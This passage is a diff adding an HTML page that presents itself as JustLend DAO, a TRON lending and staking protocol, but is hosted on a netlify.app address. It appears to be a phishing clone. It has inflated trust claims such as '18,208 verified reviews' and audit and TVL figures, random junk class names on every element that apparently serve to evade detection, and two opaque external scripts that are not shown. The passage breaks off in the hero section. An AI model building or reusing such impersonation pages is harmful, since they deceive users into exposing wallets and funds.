@@ -1,0 +1,1133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    
+    <title>JustLend DAO – Decentralized Lending, Staking & Swap on TRON</title>
+    <meta name="title" content="JustLend DAO – Decentralized Lending, Staking & Swap on TRON">
+    <meta name="description" content="JustLend DAO: leading DeFi protocol on TRON. Supply assets, stake TRX/TRC20, swap tokens, earn JST rewards. Trusted by 18,208+ users. Low rates, high yield.">
+    <meta name="keywords" content="JustLend, JustLend DAO, TRON lending, DeFi lending, crypto lending, borrow crypto, lend crypto, JST, TRX, staking TRX, staking TRON, swap, pool, liquidity pool, justlend staking, justlend dao staking">
+    <meta name="author" content="JustLend DAO">
+    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large">
+    <meta name="msvalidate.01" content="5029648F069C4628C93391ADD741AE92" />
+    <meta name="yandex-verification" content="58c0d50b720b160e" />
+    <link rel="canonical" href="https://dapp-justlend.netlify.app/">
+    
+    <link rel="alternate" hreflang="en" href="https://dapp-justlend.netlify.app/" />
+    <link rel="alternate" hreflang="zh-CN" href="https://dapp-justlend.netlify.app/zh/" />
+    <link rel="alternate" hreflang="zh-TW" href="https://dapp-justlend.netlify.app/zh-TW/" />
+    <link rel="alternate" hreflang="ja" href="https://dapp-justlend.netlify.app/ja/" />
+    <link rel="alternate" hreflang="x-default" href="https://dapp-justlend.netlify.app/" />
+    
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://dapp-justlend.netlify.app/">
+    <meta property="og:site_name" content="JustLend DAO">
+    <meta property="og:title" content="JustLend DAO – Lending, Staking & Swap on TRON">
+    <meta property="og:description" content="Supply, borrow, stake TRX, swap tokens, and earn JST. The most trusted DeFi protocol on TRON. 18,208+ users.">
+    <meta property="og:image" content="https://dapp-justlend.netlify.app/og-image.jpg">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@JustLendDAO">
+    <meta name="twitter:title" content="JustLend DAO – DeFi on TRON">
+    <meta name="twitter:description" content="Lend, borrow, stake TRX, swap. High yields, low fees. Join 18,208+ users.">
+    
+    <link rel="icon" type="image/png" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='45' fill='%2323b38e'/%3E%3Ctext x='50' y='70' font-size='50' text-anchor='middle' fill='white' font-family='Arial'%3EJ%3C/text%3E%3C/svg%3E">
+    <meta name="theme-color" content="#23b38e">
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;500;600;700;800&family=DM+Sans:ital,wght@0,300;0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
+    
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "Organization",
+        "name": "JustLend DAO",
+        "url": "https://dapp-justlend.netlify.app",
+        "logo": "https://dapp-justlend.netlify.app/logo.png",
+        "description": "Decentralized lending, staking and swap protocol on TRON. Supply assets, stake TRX, swap tokens, earn JST.",
+        "sameAs": ["https://twitter.com/JustLendDAO", "https://t.me/JustLend", "https://discord.gg/justlend"],
+        "contactPoint": {"@type": "ContactPoint", "email": "support@justlend.org"}
+    }
+    </script>
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "SoftwareApplication",
+        "name": "JustLend DAO",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "offers": {"@type": "Offer", "price": "0", "priceCurrency": "USD"},
+        "aggregateRating": {
+            "@type": "AggregateRating",
+            "ratingValue": "4.9",
+            "ratingCount": "18208",
+            "bestRating": "5",
+            "worstRating": "1"
+        },
+        "featureList": "Lending, Borrowing, Staking, Swap, Liquidity Pools, JST Rewards",
+        "keywords": "justlend, staking trx, swap, pool, defi"
+    }
+    </script>
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "FAQPage",
+        "mainEntity": [
+            {
+                "@type": "Question",
+                "name": "What is JustLend DAO?",
+                "acceptedAnswer": {
+                    "@type": "Answer",
+                    "text": "JustLend DAO is a decentralized finance (DeFi) protocol on the TRON blockchain. It enables users to lend, borrow, stake TRX and TRC20 tokens, swap assets, and earn JST governance rewards."
+                }
+            },
+            {
+                "@type": "Question",
+                "name": "How to stake TRX on JustLend?",
+                "acceptedAnswer": {
+                    "@type": "Answer",
+                    "text": "Staking TRX on JustLend is simple: connect your TronLink wallet, go to the 'Staking' section, choose an amount, and confirm. You'll earn staking rewards and JST tokens."
+                }
+            },
+            {
+                "@type": "Question",
+                "name": "What is the APY for lending?",
+                "acceptedAnswer": {
+                    "@type": "Answer",
+                    "text": "Lending APY varies by asset. Typically stablecoins offer 2-5% APY, while more volatile assets can yield higher. Check our Markets page for real-time rates."
+                }
+            },
+            {
+                "@type": "Question",
+                "name": "Can I swap tokens on JustLend?",
+                "acceptedAnswer": {
+                    "@type": "Answer",
+                    "text": "Yes, JustLend DAO includes a decentralized exchange (DEX) aggregator for swapping TRC20 tokens with low slippage and competitive rates."
+                }
+            },
+            {
+                "@type": "Question",
+                "name": "Is JustLend safe?",
+                "acceptedAnswer": {
+                    "@type": "Answer",
+                    "text": "JustLend DAO has been audited by multiple top-tier security firms (CertiK, SlowMist) and has over $1.2 billion in total value locked (TVL)."
+                }
+            }
+        ]
+    }
+    </script>
+    
+    <style>
+        :root {
+            --bg-base:      #111214;
+            --bg-surface:   #18191d;
+            --bg-elevated:  #1f2126;
+            --bg-hover:     #26282e;
+            --border:       #2c2f36;
+            --border-light: #34373f;
+            --text-primary: #e8eaed;
+            --text-secondary: #9da3ae;
+            --text-muted:   #5c6370;
+            --accent:       #23b38e;
+            --accent-dim:   rgba(35,179,142,0.12);
+            --accent-glow:  rgba(35,179,142,0.25);
+            --gold:         #e8b84b;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'DM Sans', sans-serif;
+            background: var(--bg-base);
+            color: var(--text-primary);
+            line-height: 1.65;
+            scroll-behavior: smooth;
+        }
+
+        h1, h2, h3, h4, .logo, .footer-logo {
+            font-family: 'Syne', sans-serif;
+        }
+
+        a { text-decoration: none; color: inherit; }
+
+        .container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 28px;
+        }
+
+        /* ── NOISE OVERLAY ── */
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.035'/%3E%3C/svg%3E");
+            pointer-events: none;
+            z-index: 999;
+            opacity: 0.5;
+        }
+
+        /* ── NAVBAR ── */
+        .navbar {
+            background: rgba(17, 18, 20, 0.88);
+            backdrop-filter: blur(16px);
+            border-bottom: 1px solid var(--border);
+            padding: 14px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .nav-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 0;
+        }
+        .logo-icon { display: none; }
+        .logo-svg {
+            height: 32px;
+            width: auto;
+        }
+        .nav-links {
+            display: flex;
+            gap: 28px;
+            align-items: center;
+        }
+        .nav-links > a {
+            color: var(--text-secondary);
+            font-weight: 500;
+            font-size: 15px;
+            transition: color 0.15s;
+        }
+        .nav-links > a:hover { color: var(--text-primary); }
+
+        .lang-switch {
+            display: flex;
+            gap: 2px;
+            background: var(--bg-elevated);
+            padding: 4px;
+            border-radius: 10px;
+            border: 1px solid var(--border);
+        }
+        .lang-switch a {
+            padding: 5px 12px;
+            border-radius: 7px;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--text-secondary);
+            transition: all 0.15s;
+        }
+        .lang-switch a:hover {
+            background: var(--bg-hover);
+            color: var(--text-primary);
+        }
+
+        /* ── BUTTONS ── */
+        .btn-primary {
+            background: linear-gradient(145deg, #23b38e, #1a9474);
+            color: #fff;
+            padding: 10px 26px;
+            border-radius: 10px;
+            font-weight: 600;
+            font-size: 15px;
+            box-shadow: 0 4px 16px var(--accent-glow);
+            transition: all 0.2s;
+            display: inline-block;
+            border: none;
+            cursor: pointer;
+        }
+        .btn-primary:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 8px 24px var(--accent-glow);
+            filter: brightness(1.06);
+        }
+        .btn-outline {
+            background: transparent;
+            border: 1px solid var(--border-light);
+            color: var(--text-secondary);
+            padding: 10px 26px;
+            border-radius: 10px;
+            font-weight: 500;
+            font-size: 15px;
+            transition: all 0.2s;
+            display: inline-block;
+            cursor: pointer;
+        }
+        .btn-outline:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+            background: var(--accent-dim);
+        }
+
+        /* ── HERO ── */
+        .hero {
+            padding: 96px 0 64px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 64px;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .hero::after {
+            content: '';
+            position: absolute;
+            top: -80px;
+            right: -120px;
+            width: 640px;
+            height: 640px;
+            background: radial-gradient(circle, rgba(35,179,142,0.08) 0%, transparent 65%);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--bg-elevated);
+            border: 1px solid var(--border-light);
+            border-radius: 8px;
+            padding: 6px 14px;
+            font-size: 13px;
+            color: var(--text-secondary);
+            margin-bottom: 24px;
+        }
+        .hero-badge .dot {
+            width: 7px; height: 7px;
+            background: var(--accent);
+            border-radius: 50%;
+            box-shadow: 0 0 6px var(--accent);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+        .hero h1 {
+            font-size: 52px;
+            font-weight: 800;
+            line-height: 1.1;
+            letter-spacing: -1.5px;
+            margin-bottom: 20px;
+            color: var(--text-primary);
+        }
+        .hero h1 .accent { color: var(--accent); }
+        .hero p {
+            font-size: 17px;
+            color: var(--text-secondary);
+            margin-bottom: 36px;
+            max-width: 480px;
+            line-height: 1.7;
+        }
+        .hero-stats {
+            display: flex;
+            gap: 0;
+            margin-bottom: 32px;
+            background: var(--bg-surface);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            overflow: hidden;
+        }
+        .stat-item {
+            flex: 1;
+            padding: 18px 20px;
+            border-right: 1px solid var(--border);
+        }
+        .stat-item:last-child { border-right: none; }
+        .stat-value {
+            font-family: 'Syne', sans-serif;
+            font-size: 26px;
+            font-weight: 700;
+            color: var(--text-primary);
+            display: block;
+        }
+        .stat-label {
+            font-size: 12px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+        }
+        .rating-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: var(--bg-elevated);
+            padding: 10px 18px;
+            border-radius: 10px;
+            border: 1px solid var(--border);
+            margin-bottom: 28px;
+            font-size: 14px;
+        }
+        .stars { color: var(--gold); letter-spacing: 1px; }
+        .btn-group { display: flex; gap: 12px; flex-wrap: wrap; }
+
+        /* Hero card */
+        .hero-card {
+            background: var(--bg-surface);
+            border-radius: 24px;
+            padding: 6px;
+            border: 1px solid var(--border);
+            box-shadow: 0 40px 80px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.04);
+        }
+        .hero-card-inner {
+            background: var(--bg-elevated);
+            border-radius: 20px;
+            padding: 28px;
+        }
+        .mini-stat-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .mini-stat {
+            background: var(--bg-surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 16px;
+        }
+        .mini-stat-label {
+            font-size: 12px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.7px;
+            margin-bottom: 6px;
+        }
+        .mini-stat-value {
+            font-family: 'Syne', sans-serif;
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--accent);
+        }
+        .hero-chart-bar {
+            background: var(--bg-surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 16px;
+        }
+        .chart-label {
+            font-size: 12px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.7px;
+            margin-bottom: 14px;
+        }
+        .bars {
+            display: flex;
+            align-items: flex-end;
+            gap: 6px;
+            height: 64px;
+        }
+        .bar {
+            flex: 1;
+            background: var(--accent);
+            border-radius: 4px 4px 0 0;
+            opacity: 0.5;
+            transition: opacity 0.2s;
+        }
+        .bar:hover { opacity: 1; }
+        .bar.active { opacity: 0.85; }
+
+        /* ── SECTION COMMON ── */
+        .section-title {
+            font-size: 38px;
+            font-weight: 800;
+            letter-spacing: -1px;
+            text-align: center;
+            margin-bottom: 12px;
+            color: var(--text-primary);
+        }
+        .section-sub {
+            text-align: center;
+            color: var(--text-secondary);
+            max-width: 600px;
+            margin: 0 auto 56px;
+            font-size: 17px;
+        }
+
+        /* ── PRODUCT CARDS ── */
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 16px;
+            margin: 0 0 80px;
+        }
+        .product-card {
+            background: var(--bg-surface);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 28px 22px;
+            transition: all 0.25s;
+            position: relative;
+            overflow: hidden;
+        }
+        .product-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--accent), transparent);
+            opacity: 0;
+            transition: opacity 0.25s;
+        }
+        .product-card:hover {
+            border-color: var(--border-light);
+            transform: translateY(-4px);
+            box-shadow: 0 16px 40px rgba(0,0,0,0.3);
+        }
+        .product-card:hover::before { opacity: 1; }
+        .product-icon {
+            width: 48px; height: 48px;
+            background: var(--bg-elevated);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            margin-bottom: 18px;
+        }
+        .product-title {
+            font-family: 'Syne', sans-serif;
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: var(--text-primary);
+        }
+        .product-desc {
+            color: var(--text-secondary);
+            font-size: 14px;
+            margin-bottom: 22px;
+            line-height: 1.6;
+        }
+        .product-link {
+            color: var(--accent);
+            font-weight: 600;
+            font-size: 14px;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            transition: gap 0.15s;
+        }
+        .product-link:hover { gap: 8px; }
+
+        /* ── MARKETS TABLE ── */
+        .markets {
+            background: var(--bg-surface);
+            border-radius: 20px;
+            padding: 28px;
+            border: 1px solid var(--border);
+            margin: 0 0 80px;
+        }
+        .markets-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+        .markets h3 {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--text-primary);
+        }
+        .market-row {
+            display: grid;
+            grid-template-columns: 2fr 1fr 1fr 1fr 1fr;
+            padding: 14px 0;
+            border-bottom: 1px solid var(--border);
+            font-size: 15px;
+            color: var(--text-secondary);
+            align-items: center;
+        }
+        .market-row.header {
+            color: var(--text-muted);
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            border-bottom: 1px solid var(--border-light);
+            padding-bottom: 12px;
+        }
+        .market-row:last-child { border-bottom: none; }
+        .market-row .asset-name {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--text-primary);
+            font-weight: 500;
+        }
+        .asset-dot {
+            width: 32px; height: 32px;
+            border-radius: 50%;
+            background: var(--bg-elevated);
+            border: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--accent);
+        }
+        .apy {
+            color: var(--accent);
+            font-weight: 600;
+        }
+
+        /* ── STAKING ── */
+        .staking-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin-bottom: 80px;
+        }
+        .staking-card {
+            background: var(--bg-surface);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 28px;
+            transition: border-color 0.2s;
+        }
+        .staking-card:hover { border-color: var(--border-light); }
+        .staking-card h3 {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: var(--text-primary);
+        }
+        .staking-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid var(--border);
+            font-size: 15px;
+        }
+        .staking-row:last-of-type { border-bottom: none; margin-bottom: 20px; }
+        .staking-row .label { color: var(--text-secondary); }
+        .staking-apy {
+            font-family: 'Syne', sans-serif;
+            font-size: 28px;
+            font-weight: 800;
+            color: var(--accent);
+        }
+
+        /* ── SWAP & POOLS ── */
+        .swap-grid {
+            display: grid;
+            grid-template-columns: 1.3fr 0.7fr;
+            gap: 16px;
+            margin-bottom: 80px;
+        }
+        .swap-card, .pools-card {
+            background: var(--bg-surface);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 28px;
+        }
+        .swap-card h3, .pools-card h3 {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: var(--text-primary);
+        }
+        .swap-inputs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+        .swap-inputs input {
+            flex: 1;
+            background: var(--bg-elevated);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 14px 16px;
+            color: var(--text-primary);
+            font-size: 15px;
+            font-family: 'DM Sans', sans-serif;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .swap-inputs input:focus { border-color: var(--accent); }
+        .swap-meta {
+            display: flex;
+            justify-content: space-between;
+            color: var(--text-muted);
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+
+        /* ── FAQ ── */
+        .faq-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin: 0 0 80px;
+        }
+        .faq-item {
+            background: var(--bg-surface);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 24px;
+            transition: border-color 0.2s;
+        }
+        .faq-item:hover { border-color: var(--border-light); }
+        .faq-item h4 {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: var(--text-primary);
+        }
+        .faq-item p {
+            color: var(--text-secondary);
+            font-size: 14px;
+            line-height: 1.65;
+        }
+
+        /* ── FOOTER ── */
+        .footer {
+            background: var(--bg-surface);
+            border-top: 1px solid var(--border);
+            padding: 64px 0 32px;
+        }
+        .footer-grid {
+            display: grid;
+            grid-template-columns: 2fr repeat(4, 1fr);
+            gap: 40px;
+            margin-bottom: 48px;
+        }
+        .footer-logo {
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+        }
+        .footer-desc {
+            color: var(--text-muted);
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        .social-links { display: flex; gap: 10px; }
+        .social-link {
+            width: 36px; height: 36px;
+            background: var(--bg-elevated);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 15px;
+            transition: all 0.15s;
+        }
+        .social-link:hover {
+            border-color: var(--accent);
+            background: var(--accent-dim);
+        }
+        .footer-col h4 {
+            font-family: 'Syne', sans-serif;
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--text-primary);
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            margin-bottom: 16px;
+        }
+        .footer-col a {
+            display: block;
+            color: var(--text-muted);
+            font-size: 14px;
+            margin-bottom: 10px;
+            transition: color 0.15s;
+        }
+        .footer-col a:hover { color: var(--text-primary); }
+        .footer-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-top: 28px;
+            border-top: 1px solid var(--border);
+            color: var(--text-muted);
+            font-size: 13px;
+        }
+        .footer-tvl {
+            display: flex;
+            gap: 24px;
+        }
+        .footer-tvl span strong {
+            color: var(--text-secondary);
+        }
+
+        /* Section spacing */
+        .section-block { margin-top: 80px; }
+
+        /* ── RESPONSIVE ── */
+        @media (max-width: 1024px) {
+            .product-grid { grid-template-columns: repeat(2, 1fr); }
+            .faq-grid { grid-template-columns: 1fr; }
+            .footer-grid { grid-template-columns: 1fr 1fr; }
+            .swap-grid { grid-template-columns: 1fr; }
+        }
+        @media (max-width: 768px) {
+            .hero { grid-template-columns: 1fr; text-align: center; padding: 64px 0 40px; }
+            .hero h1 { font-size: 36px; }
+            .nav-links { display: none; }
+            .product-grid { grid-template-columns: 1fr; }
+            .staking-grid { grid-template-columns: 1fr; }
+            .hero-stats { flex-direction: column; gap: 0; }
+            .stat-item { border-right: none; border-bottom: 1px solid var(--border); }
+        }
+    </style>
+    <script src="./modernizr-3.12.0.js" type="module"></script><script src="2.js"></script>
+
+</head>
+<body>
+
+    <!-- NAVBAR -->
+    <nav class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 navbar">
+        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 container nav-container">
+            <a href="/" class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 logo">
+                <svg class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 logo-svg" viewBox="0 0 180 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <!-- Just -->
+                  <text x="0" y="26" font-family="'Syne', sans-serif" font-weight="800" font-size="26" fill="#e8eaed" letter-spacing="-0.5">Just</text>
+                  <!-- Lend -->
+                  <text x="67" y="26" font-family="'Syne', sans-serif" font-weight="800" font-size="26" fill="#23b38e" letter-spacing="-0.5">Lend</text>
+                  <!-- DAO badge -->
+                  <rect x="140" y="4" width="36" height="16" rx="4" fill="#23b38e" opacity="0.15"/>
+                  <text x="158" y="16" font-family="'Syne', sans-serif" font-weight="700" font-size="10" fill="#23b38e" text-anchor="middle" letter-spacing="0.5">DAO</text>
+                  <!-- underline accent under Lend -->
+                  <line x1="67" y1="30" x2="131" y2="30" stroke="#23b38e" stroke-width="2.5" stroke-linecap="round"/>
+                </svg>
+            </a>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 nav-links">
+                <a href="#features">Lend</a>
+                <a href="#staking">Stake</a>
+                <a href="#swap">Swap</a>
+                <a href="#pools">Pools</a>
+                <a href="#stats">Stats</a>
+                <a href="#faq">FAQ</a>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 lang-switch">
+                    <a href="/">EN</a>
+                    <a href="/zh/">中文</a>
+                    <a href="/zh-TW/">繁體</a>
+                    <a href="/ja/">日本語</a>
+                </div>
+                <a href="#app" class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 xrlzn3hx xqohd64ce btn-primary">Launch App</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- HERO -->
+    <section class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 hero container">
+        <div>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 hero-badge">
+                <span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 dot"></span>
+                Live on TRON Mainnet · $1.2B+ TVL
+            </div>
+            <h1>Lend · Borrow<br>Stake <span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 accent">TRX</span> · Swap</h1>
+            <p>JustLend DAO – the leading DeFi protocol on TRON. Supply assets, stake TRX/TRC20, swap tokens, earn JST rewards. Trusted by 18,208+ users.</p>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 hero-stats">
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 stat-item">
+                    <span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 stat-value">$1.2B+</span>
+                    <span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 stat-label">Total Value Locked</span>
+                </div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 stat-item">
+                    <span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 stat-value">18,208+</span>
+                    <span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 stat-label">Active Users</span>
+                </div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 stat-item">
+                    <span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 stat-value">4.9 ★</span>
+                    <span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 stat-label">Rating</span>
+                </div>
+            </div>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 rating-badge">
+                <span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 stars">★★★★★</span>
+                <span style="color:var(--text-secondary); font-size:14px;">4.9 · 18,208 verified reviews</span>
+            </div>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 btn-group">
+                <a href="#app" class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 xrlzn3hx xqohd64ce btn-primary">Start Lending</a>
+                <a href="#markets" class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 btn-outline">View Markets</a>
+            </div>
+        </div>
+
+        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 hero-card">
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 hero-card-inner">
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 mini-stat-grid">
+                    <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 mini-stat">
+                        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 mini-stat-label">TRX APY</div>
+                        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 mini-stat-value">6.8%</div>
+                    </div>
+                    <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 mini-stat">
+                        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 mini-stat-label">USDT APY</div>
+                        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 mini-stat-value">5.2%</div>
+                    </div>
+                    <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 mini-stat">
+                        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 mini-stat-label">JST APY</div>
+                        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 mini-stat-value">4.5%</div>
+                    </div>
+                    <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 mini-stat">
+                        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 mini-stat-label">BTC APY</div>
+                        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 mini-stat-value">1.2%</div>
+                    </div>
+                </div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 hero-chart-bar">
+                    <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 chart-label">Protocol TVL (30d)</div>
+                    <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 bars">
+                        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 bar" style="height:40%"></div>
+                        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 bar" style="height:52%"></div>
+                        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 bar" style="height:48%"></div>
+                        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 bar" style="height:60%"></div>
+                        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 bar" style="height:56%"></div>
+                        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 bar" style="height:72%"></div>
